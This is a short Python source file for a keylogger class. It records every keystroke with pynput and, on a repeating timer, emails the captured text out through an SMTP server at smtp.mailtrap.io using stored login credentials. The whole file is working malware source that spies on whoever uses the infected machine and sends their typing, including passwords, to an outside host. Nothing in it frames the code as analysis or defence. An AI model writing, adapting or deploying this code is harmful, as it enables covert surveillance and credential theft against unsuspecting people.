#!usr/bin/env python

import pynput.keyboard , threading, smtplib

class Keylogger:
    def __init__(self, time, id, passwd):
        self.log = "Keylogger Started"
        self.time = time
        self.id = id
        self.passwd = passwd

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key =  " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_email(self.id, self.passwd, "\n\n" +self.log)
        #print(self.log)
        self.log = ""
        timer = threading.Timer(self.time , self.report)
        timer.start()

    def send_email(self, id, passwd, msg):
        server = smtplib.SMTP("smtp.mailtrap.io", 2525)
        server.starttls()
        server.login(id, passwd)
        server.sendmail(id, id, msg)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()